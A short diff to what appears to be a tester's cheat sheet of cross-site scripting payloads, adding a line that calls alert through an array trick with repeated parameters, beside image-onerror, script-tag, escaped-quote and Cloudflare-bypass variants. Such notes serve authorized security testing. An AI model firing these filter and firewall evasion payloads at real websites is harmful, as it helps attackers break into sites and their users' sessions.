@@ -341,6 +341,7 @@ login
  https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
             <img/src/onerror=alert(1)>
 - <script>alert(\"hossam\")</script>        // add \ before " to escape filter
+- id=alert;[alert][0].call(this,1)&y=all&y=all
 - cloudflare bypass 
 "-alert(0)-"		X
 "-top['al\x65rt'](9)-"	good
